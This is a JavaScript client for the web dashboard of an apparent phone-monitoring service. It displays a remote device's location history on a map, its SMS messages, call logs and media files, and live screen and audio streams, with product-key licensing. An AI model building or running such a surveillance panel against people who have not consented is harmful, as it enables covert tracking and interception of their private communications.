// backend/frontend/public/js/dashboard.js
// Dashboard client - improved: socket streaming handlers, robust element handling, dynamic device join

const token = localStorage.getItem('token');
if (!token) {
  window.location = '/';
}

let currentDevice = null;
let socket = null;
let map = null;
let markers = [];
let screenCaptureVideo = null;
let audioCapture = null;

// helper: simple API call with auth
async function apiGet(path) {
  const r = await fetch('/api/' + path, { headers: { Authorization: 'Bearer ' + token } });
  if (!r.ok) throw new Error('api error ' + r.status);
  return r.json();
}

// init entry
async function init() {
  try {
    // get elements (may not exist on some pages)
    screenCaptureVideo = document.getElementById('screenCapture');
    audioCapture = document.getElementById('audioCapture');

    // show user/devices
    const userBox = document.getElementById('userBox');
    const licenseBox = document.getElementById('licenseBox');

    // fetch devices
    let devices = [];
    try { devices = await apiGet('devices'); } catch (e) { console.error('devices fetch error', e); }

    if (userBox) userBox.innerText = 'Devices: ' + (devices.length || 0);

    // init map
    initMap();

    // init socket (after map ready)
    initSocket();

    // UI handlers (guard elements exist)
    const btnLogout = document.getElementById('btnLogout');
    if (btnLogout) btnLogout.addEventListener('click', () => { localStorage.removeItem('token'); window.location = '/'; });

    const btnLocations = document.getElementById('btnLocations');
    if (btnLocations) btnLocations.addEventListener('click', async () => {
      showPanel('panel-locations');
      // choose first device by default (you can add device selection later)
      const deviceId = devices[0] ? devices[0].deviceId : null;
      await loadLocations(deviceId);
      if (deviceId) joinDeviceRoom(deviceId);
    });

    const btnSms = document.getElementById('btnSms');
    if (btnSms) btnSms.addEventListener('click', async () => { showPanel('panel-sms'); await loadSms(); });

    const btnCalls = document.getElementById('btnCalls');
    if (btnCalls) btnCalls.addEventListener('click', async () => { showPanel('panel-calls'); await loadCalls(); });

    const btnMedia = document.getElementById('btnMedia');
    if (btnMedia) btnMedia.addEventListener('click', async () => { showPanel('panel-media'); await loadMedia(); });

    const btnProductKey = document.getElementById('btnProductKey');
    if (btnProductKey) btnProductKey.addEventListener('click', () => { window.location = '/productkey.html'; });

    const btnScreenCapture = document.getElementById('btnScreenCapture');
    if (btnScreenCapture) btnScreenCapture.addEventListener('click', async () => {
      // join current device (if not already)
      const deviceId = devices[0] ? devices[0].deviceId : null;
      if (!deviceId) return alert('No device available');
      showPanel('panel-screen-capture');
      joinDeviceRoom(deviceId);
      // request server to start streaming? (optional endpoint/command)
    });

    const btnAudioCapture = document.getElementById('btnAudioCapture');
    if (btnAudioCapture) btnAudioCapture.addEventListener('click', async () => {
      const deviceId = devices[0] ? devices[0].deviceId : null;
      if (!deviceId) return alert('No device available');
      showPanel('panel-audio-capture');
      joinDeviceRoom(deviceId);
    });

  } catch (e) {
    console.error('init error', e);
  }
}

function showPanel(id) {
  document.querySelectorAll('.panel').forEach(p => p.classList.add('hidden'));
  const el = document.getElementById(id);
  if (el) el.classList.remove('hidden');
}

function initMap() {
  try {
    if (map) return;
    if (!document.getElementById('map')) return;
    map = L.map('map').setView([0,0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
  } catch (e) {
    console.error('initMap error', e);
  }
}

async function loadLocations(deviceId) {
  try {
    const qs = deviceId ? '?deviceId=' + encodeURIComponent(deviceId) : '';
    const list = await apiGet('data/location' + qs);
    const listEl = document.getElementById('locList');
    if (listEl) listEl.innerHTML = '';
    // clear markers
    if (map && markers.length) {
      markers.forEach(m => map.removeLayer(m));
      markers = [];
    }
    list.forEach(l => {
      if (listEl) {
        const li = document.createElement('li');
        li.textContent = `${l.lat.toFixed(5)}, ${l.lon.toFixed(5)} — ${new Date(l.timestamp).toLocaleString()}`;
        listEl.appendChild(li);
      }
      if (map) {
        const m = L.marker([l.lat, l.lon]).addTo(map);
        m.bindPopup(`<b>${new Date(l.timestamp).toLocaleString()}</b><br/>${l.lat.toFixed(6)}, ${l.lon.toFixed(6)}<br/><a target="_blank" href="https://www.google.com/maps/search/?api=1&query=${l.lat},${l.lon}">Abrir no Google Maps</a>`);
        markers.push(m);
      }
    });
    if (markers.length && map) {
      const group = new L.featureGroup(markers);
      map.fitBounds(group.getBounds().pad(0.2));
    }
  } catch (e) {
    console.error('loadLocations error', e);
  }
}

async function loadSms() {
  try {
    const list = await apiGet('data/sms');
    const el = document.getElementById('smsList'); if (!el) return;
    el.innerHTML = '';
    list.forEach(s => {
      const li = document.createElement('li');
      li.textContent = `${s.sender}: ${s.message} (${new Date(s.timestamp).toLocaleString()})`;
      el.appendChild(li);
    });
  } catch (e) { console.error('loadSms error', e); }
}

async function loadCalls() {
  try {
    const list = await apiGet('data/call');
    const el = document.getElementById('callList'); if (!el) return;
    el.innerHTML = '';
    list.forEach(c => {
      const li = document.createElement('li');
      li.textContent = `${c.number || 'unknown'} - ${c.state} (${c.duration || ''}) ${new Date(c.timestamp).toLocaleString()}`;
      el.appendChild(li);
    });
  } catch (e) { console.error('loadCalls error', e); }
}

async function loadMedia() {
  try {
    const list = await apiGet('media');
    const el = document.getElementById('mediaList'); if (!el) return;
    el.innerHTML = '';
    list.forEach(m => {
      const li = document.createElement('li');
      const a = document.createElement('a');
      a.href = '/api/media/' + m._id;
      a.textContent = (m.filename || m._id) + ' (' + (m.type||'') + ')';
      a.target = '_blank';
      li.appendChild(a);
      el.appendChild(li);
    });
  } catch (e) { console.error('loadMedia error', e); }
}

// SOCKET helpers
function initSocket() {
  try {
    if (socket) return;
    socket = io(); // default connects to same host

    socket.on('connect', () => {
      console.log('socket connected', socket.id);
    });

    // realtime location events from server
    socket.on('location', data => {
      if (!data || !data.deviceId) return;
      // if we are viewing/joined this device, show marker
      if (currentDevice && data.deviceId === currentDevice) {
        addMarker(data.lat, data.lon, data.timestamp || Date.now());
        updateLastSeen(new Date(data.timestamp || Date.now()));
      }
    });

    // screen capture: may be binary (ArrayBuffer) or base64 string or object {type, data}
    socket.on('screenCapture', payload => {
      if (!screenCaptureVideo) return;
      try {
        const blob = normalizeBinaryPayloadToBlob(payload);
        if (!blob) return;
        const url = URL.createObjectURL(blob);
        screenCaptureVideo.src = url;
        // auto revoke previous object URLs to avoid mem leak
        setTimeout(() => { URL.revokeObjectURL(url); }, 30000);
      } catch (e) {
        console.error('screenCapture handler error', e);
      }
    });

    // audio capture: same normalization
    socket.on('audioCapture', payload => {
      if (!audioCapture) return;
      try {
        const blob = normalizeBinaryPayloadToBlob(payload, 'audio/mpeg');
        if (!blob) return;
        const url = URL.createObjectURL(blob);
        audioCapture.src = url;
        audioCapture.play().catch(()=>{});
        setTimeout(() => { URL.revokeObjectURL(url); }, 30000);
      } catch (e) {
        console.error('audioCapture handler error', e);
      }
    });

    socket.on('disconnect', () => {
      console.log('socket disconnected');
    });
  } catch (e) {
    console.error('initSocket error', e);
  }
}

// leave previous room and join new
function joinDeviceRoom(deviceId) {
  if (!socket) initSocket();
  if (!deviceId) return;
  if (currentDevice && currentDevice === deviceId) return; // already in
  if (currentDevice) {
    try { socket.emit('leaveDevice', currentDevice); } catch(e){}
  }
  currentDevice = deviceId;
  socket.emit('joinDevice', deviceId);
  console.log('joined device room', deviceId);
}

// convert payload (ArrayBuffer / base64 string / object) -> Blob
function normalizeBinaryPayloadToBlob(payload, fallbackMime) {
  // payload may be ArrayBuffer, Blob, Uint8Array, or string (base64 or data: url), or object {type, data}
  if (!payload) return null;

  // if server sent an object { type, data } where data is base64 or binary
  if (typeof payload === 'object' && !(payload instanceof ArrayBuffer) && !(payload instanceof Blob) && !(payload instanceof Uint8Array)) {
    // check for fields
    if (payload.data && payload.type) {
      return normalizeBinaryPayloadToBlob(payload.data, payload.type);
    } else if (payload.data) {
      return normalizeBinaryPayloadToBlob(payload.data, fallbackMime);
    }
  }

  // if payload already Blob
  if (payload instanceof Blob) return payload;

  // if ArrayBuffer
  if (payload instanceof ArrayBuffer) {
    return new Blob([payload], { type: fallbackMime || 'application/octet-stream' });
  }

  // if Uint8Array
  if (payload instanceof Uint8Array) {
    return new Blob([payload.buffer], { type: fallbackMime || 'application/octet-stream' });
  }

  // if payload is string: could be 'data:TYPE;base64,XXXXX' or raw base64
  if (typeof payload === 'string') {
    // data URL
    if (payload.startsWith('data:')) {
      const comma = payload.indexOf(',');
      const meta = payload.substring(5, comma);
      const data = payload.substring(comma + 1);
      const isBase64 = meta.endsWith(';base64');
      const mime = isBase64 ? meta.replace(';base64','') : (meta || fallbackMime);
      const bytes = isBase64 ? base64ToUint8Array(data) : new TextEncoder().encode(decodeURIComponent(data));
      return new Blob([bytes.buffer], { type: mime || fallbackMime || 'application/octet-stream' });
    } else {
      // assume plain base64
      try {
        const bytes = base64ToUint8Array(payload);
        return new Blob([bytes.buffer], { type: fallbackMime || 'application/octet-stream' });
      } catch (e) {
        console.warn('normalizeBinaryPayload: cannot parse string payload', e);
        return null;
      }
    }
  }

  console.warn('normalizeBinaryPayload: unknown payload type', payload);
  return null;
}

function base64ToUint8Array(b64) {
  const binary_string = atob(b64);
  const len = binary_string.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binary_string.charCodeAt(i);
  }
  return bytes;
}

// add realtime marker
function addMarker(lat, lon, timestamp) {
  if (!map) initMap();
  try {
    const m = L.circleMarker([lat, lon], { radius: 6 }).addTo(map);
    markers.push(m);
    // limit
    if (markers.length > 200) {
      const old = markers.shift();
      if (old) map.removeLayer(old);
    }
  } catch (e) {
    console.error('addMarker error', e);
  }
}

function updateLastSeen(d) {
  const el = document.getElementById('licenseBox') || document.getElementById('lastSeen');
  if (el) el.innerText = d ? d.toLocaleString() : '-';
}

// start
window.addEventListener('load', init);
